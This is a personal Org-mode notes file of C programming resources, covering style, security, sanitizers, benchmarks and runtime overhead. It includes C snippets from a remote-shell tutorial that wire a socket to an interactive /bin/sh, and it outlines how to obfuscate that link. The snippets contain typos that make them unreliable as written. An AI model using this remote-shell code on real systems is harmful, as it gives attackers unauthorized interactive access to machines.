- https://jangafx.com/insights/linux-binary-compatibility
- https://learnxinyminutes.com/c/
- 21 Don't use math.h/div(3) https://eklitzke.org/don't-use-div(3)
- https://overflow.hostux.net/questions/2565727/which-functions-from-the-standard-library-must-should-be-avoided
- https://sekrit.de/webdocs/c/beginners-guide-away-from-scanf.html
- course
  - https://cse.buffalo.edu/~eblanton/course/cse410-2018-2f/
  - https://cse.buffalo.edu/~eblanton/course/cse410-2018-2f/materials/2018-2F/
- style https://www.gnu.org/prep/standards/standards.html
- style https://suckless.org/coding_style/
- https://github.com/oz123/awesome-c?tab=readme-ov-file#learning-reference-and-tutorials
- https://text.causal.agency/003-pleasant-c.txt
- https://text.causal.agency/005-testing-c.txt
- https://text.causal.agency/006-some-libs.txt
- https://text.causal.agency/020-c-style.txt
- https://sqlite.org/whyc.html
- sockets https://roscas.github.io/reseau/Linux-Sockets-CheatSheet.html
- https://www.deusinmachina.net/p/c-strings-and-my-slow-descent-to
- Few lesser known tricks, quirks and features of C https://blog.joren.ga/less-known-c
- The “Build Your Own Redis” Book Is Completed https://news.ycombinator.com/item?id=34572263
- Article: https://suckless.org/coding_style/
- 10 https://web.archive.org/web/20100715074224/https://www.securecoding.cert.org/confluence/display/seccode/STR05-C.+Use+pointers+to+const+when+referring+to+string+literals
- 11 Object-oriented design patterns in the kernel, part 1 https://lwn.net/Articles/444910/
- 11 https://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html
- 16 https://matt.sh/howto-c
- 21 unfashionable C https://www.yodaiken.com/2021/05/21/your-computer-is-a-fast-pdp-11-and-more-on-c-the-c-standard-and-computer-architecture/
- 18 C Is Not a Low-level Language https://queue.acm.org/detail.cfm?id=3212479
- c2x https://habr.com/en/company/badoo/blog/512802/
* 0x00sec - Remote Shells
**   I Use Cases
https://0x00sec.org/t/remote-shells-part-i/269/1

- Remote Access:
  In the cases when is NOT possible to deploy a service like "ssh" or "telnet"
  you can easily write your own remote shell program.

- Types of Remote Shells
  - Direct: act like servers
  - Reverse: the application "calls back home" to a specifict server/port

** client

#+begin_src c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>

  int client_init(char *ip, int port) {
    int s;
    if ((s = socket(AF_INET; SOCK_STREAM, 0) < 0) {
        perror("socket:");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(port);
    serv.sin_addr.s_s_addr = inet_addr(ip);
    if (connect(s, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
      perror("connect:");
      exit(EXIT_FAILURE);
    }

    return s;
  }
#+end_src

** server

#+begin_src c
  inet server_init(int port) {
    int s;
    if ((s = socket(AF_INET, SOCK_STREAM, 0) < 0)) {
      perror("socket:");
      exit(EXIT_FAILURE);
    }

    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(port);
    serv.sin_addr.s_addr = htonl(INADDR_ANY);
    if ((bind(s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0) {
      perror("bind:");
      exit(EXIT_FAILURE);
    }
    if ((listen(s, 10)) < 0) {
      perror("listen:");
      exit(EXIT_FAILURE);
    }

    socklen_t clen = sizeof(struct sockaddr_in);
    struct sockaddr_in client;
    int s1;
    if ((s1 = accept(s, (struct sockaddr *) &client, &clen)) < 0) {
      perror("accept:");
      exit(EXIT_FAILURE);
    }
    return s1;
  }
#+end_src

** start_shell

#+begin_src c
  int start_shell(int s) {
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    char *name[3];
    name[0] = "/bin/sh";
    name[1] = "-i";
    name[2] = NULL;
    execve(name[0], name);
    exit(1);
    return 0;
  }
#+end_src

**  II Crypt your link
- https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306
- https://en.wikipedia.org/wiki/Loop_unrolling

- SocketPair
  - Used to transfer data
  - Are a pair of sockets that are immediatly connected
    Something like runing a client and a server in 1 call
  - Kind of like a bidirectional PIPE
  - Convenient IPC

- secure_shell()
  | Parent       | Child              |
  |--------------+--------------------|
  | socketpair() |                    |
  | fork()       | fork()             |
  | close(sp[0]) | close(sp[1])       |
  | async_read() | start_shell(sp[0]) |

- async_read()
  select()
  memset()
  read()
  memfrob()

- We use stdin socket as the input socket for async_read() on main()

** III Shell Access your Phone
- setsockopt() - SO_REUSEADDR

* (in)security
- banned stdlib functions in git source https://github.com/git/git/blob/master/banned.h
- Passing user supplied data to ~printf~ first/format argument, can result in a security vulnerability
- A Guide to Undefined Behavior in C and C++, Part 1
  https://blog.regehr.org/archives/213
- https://github.com/microsoft/checkedc
- https://fastcompression.blogspot.com/2019/01/writing-safer-c-code.html
- https://github.com/gerasdf/InsecureProgramming/
- https://github.com/hardik05/Damn_Vulnerable_C_Program
** Sanitizers
|-------+----------------------------+-------------|
|   <r> |                            |             |
|       |                            | -fsanitize= |
|-------+----------------------------+-------------|
| UBSan | undefined behavior         | undefined   |
|  ASan | addressing of memory       | address     |
|  MSan | uninitialized memory usage | memory      |
|  TSan | thread concurrency bugs    | thread      |
|-------+----------------------------+-------------|
- https://github.com/google/sanitizers/wiki/MemorySanitizer
- https://github.com/google/sanitizers/wiki/AddressSanitizer
  https://clang.llvm.org/docs/AddressSanitizer.html
- https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html
  - Compile with -g, -fno-sanitize-merge and -fno-omit-frame-pointer to get proper debug information in your binary.
  - Run your program with environment variable UBSAN_OPTIONS=print_stacktrace=1.
  - Make sure llvm-symbolizer binary is in PATH.

- valgrind, fuzzers, libcheck, pvs
- https://tek256.com/posts/code-hardening/
- Static http://splint.org/
- video fuzzers 15 [[https://www.youtube.com/watch?v=qTkYDA0En6U][Beyond Sanitizers...]] by Kostya Serebryany
- https://www.youtube.com/watch?v=Q2C2lP8_tNE
- https://valgrind.org/docs/manual/quick-start.html
- https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html
* Benchmarks
- Benchmark: https://www.wilfred.me.uk/blog/2014/10/20/the-fastest-bigint-in-the-west/
- Benchmark: FFI https://github.com/dyu/ffi-overhead
  - Golang is 40x slower than C
  - Haskell,Ocaml(opt),Rust are on par with C
  - Ocaml(C) is 4x slower
  - LuaJit is faster than C, https://github.com/dyu/ffi-overhead/issues/2#issuecomment-405834411
    "Using JITing to skip PLT inderection"
    "Same on C would be -fno-plt"

* Article: C Runtime Overhead
  http://ryanhileman.info/posts/lib43
  https://news.ycombinator.com/item?id=29783585
- overhead is 9ms of linker and glibc
- strace -tt shows time in microseconds
- baseline time without stdlib 0.5ms (-ffreestanding -nostdlib)
  #+begin_src c
    // gcc -m32 -ffreestanding -nostdlib
    void _start() {
        /* exit system call */
        asm("movl $1,%eax;"
            "xorl %ebx,%ebx;"
            "int  $0x80"
        );
    }
  #+end_src
- =Bloom filter=, to test SET belongs, for big datasets
  gives false-positive
  do not gives false-negatives
  https://en.wikipedia.org/wiki/Bloom_filter
- 1ms in linking
- 5ms in glibc load
- portable startime libc https://github.com/lunixbochs/lib43
